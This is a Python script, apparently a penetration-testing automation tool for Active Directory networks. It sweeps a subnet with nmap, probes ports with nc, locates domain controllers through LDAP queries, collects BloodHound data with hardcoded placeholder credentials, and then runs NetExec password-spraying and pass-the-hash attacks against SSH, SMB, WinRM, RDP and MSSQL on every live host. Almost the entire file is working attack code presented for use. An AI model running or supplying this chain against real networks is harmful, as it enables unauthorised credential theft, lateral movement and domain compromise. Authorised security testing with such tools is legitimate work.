import subprocess

# Define the network range for scanning
network_range = "192.168.1.0/24"

# Output file for active IPs
ip_list_file = "IP_list.txt"

# Ports to scan
ports = {
    "WinRM": 5985,
    "LDAP": 389,
    "LDAPS": 636,
    "SSH": 22,
    "MSSQL": 1433,
    "SMB": 445,
    "RDP": 3389
}

# Credentials files
users_file = "users.txt"
passwords_file = "passwords.txt"
hashes_file = "hashes.txt"

def run_nmap_scan():
    """Perform an Nmap sweep scan and save active IPs to a file."""
    print("[*] Running Nmap scan on the network...")
    nmap_command = f"nmap -sn {network_range} -oG - | awk '/Up$/{{print $2}}' > {ip_list_file}"
    subprocess.run(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(f"[+] Active IPs saved to {ip_list_file}.")

def check_ports():
    """Scan for specific service ports and alert if any critical ports are open."""
    print("[*] Scanning for open ports...")
    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f]

    for ip in ips:
        open_ports = []
        for service, port in ports.items():
            result = subprocess.run(f"nc -zv {ip} {port} 2>&1", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if "succeeded" in result.stderr.decode() or "open" in result.stdout.decode():
                open_ports.append(service)
        
        if open_ports:
            print(f"[!] {ip} has open services: {', '.join(open_ports)}")
            if any(p in open_ports for p in ["SSH", "SMB", "WinRM", "RDP", "MSSQL"]):
                print("[!!] b3 c4r3fu1!")

def identify_domain_controllers():
    """Identify potential Domain Controllers (DCs) using LDAP enumeration."""
    print("[*] Identifying Domain Controllers...")
    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f]

    for ip in ips:
        result = subprocess.run(f"ldapsearch -x -h {ip} -s base | grep -i 'namingContexts'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.stdout:
            print(f"[DC!] {ip} appears to be a Domain Controller!")
            with open("DC_list.txt", "a") as log:
                log.write(f"{ip}\n")

def bloodhound_collect():
    """Collect BloodHound data from detected DCs."""
    print("[*] Collecting BloodHound data...")
    with open("DC_list.txt", "r") as f:
        dcs = [line.strip() for line in f]

    for dc in dcs:
        command = f"bloodhound-python -u 'admin' -p 'password' -d 'domain.local' -c All -dc {dc}"
        subprocess.run(command, shell=True)
        print(f"[+] BloodHound data collection complete for: {dc}")

def run_netexec():
    """Perform password spraying and pass-the-hash attacks using NetExec."""
    print("[*] Running credential brute-force and pass-the-hash attacks...")
    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f]

    for ip in ips:
        for service, port in ports.items():
            if port in [22, 445, 5985, 3389, 1433]:  # Targeted services
                # Password spraying
                print(f"[*] Performing password spraying on {ip} - {service}...")
                subprocess.run(f"netexec {service.lower()} {ip} -u {users_file} -p {passwords_file}", shell=True)

                # Pass-the-hash
                print(f"[*] Testing pass-the-hash on {ip} - {service}...")
                subprocess.run(f"netexec {service.lower()} {ip} -u {users_file} -H {hashes_file}", shell=True)

if __name__ == "__main__":
    run_nmap_scan()
    check_ports()
    identify_domain_controllers()
    bloodhound_collect()
    run_netexec()
    print("[+] All tasks completed successfully!")
